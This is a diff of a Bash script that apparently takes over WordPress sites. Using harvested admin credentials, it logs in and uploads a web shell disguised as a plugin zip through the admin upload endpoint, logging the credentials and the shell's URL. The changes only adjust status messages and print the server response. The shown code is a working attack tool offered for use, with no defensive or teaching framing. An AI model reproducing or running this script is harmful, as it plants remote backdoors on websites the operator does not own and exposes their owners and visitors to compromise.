@@ -19,9 +19,7 @@ ekse(){
 	echo "Username : $user" | tee -a $file
 	echo "Password : $pass" | tee -a $file
 	echo "Email    : $email" | tee -a $file
-	printf "$blue[!]Checking Login$white\n"
 	login
-	printf "$blue[!]Uploading Shell$white\n"
 	upload
 	elif [[ $(curl --silent --url "$site/wp-admin/install.php") =~ '<h1>Already Installed</h1>' ]];
 	then
@@ -52,9 +50,10 @@ upload(){
 	ups=`curl -s -b "$COOKIE_LOG" -F "_wpnonce=$mek" -F "_wp_http_referer=$mik" -F "pluginzip=@$shell" -F "install-plugin-submit=Install+Now" --url "$site/wp-admin/update.php?action=upload-plugin"`
 	if [[ "$ups" =~ "Installing Plugin from uploaded file" ]];
 	then
-	echo "Success Uploading Shell $site/wp-content/uploads/$TAHUN/$BULAN/$shell" | tee -a $file
+	echo "Success Uploading Shell $site/wp-content/uploads/$TAHUN/$BULAN/$shell"
 	else
 	echo "Failed Try Manual"
+	echo "$ups"
 	fi
 	rm "$COOKIE_LOG" 2> /dev/null
 }
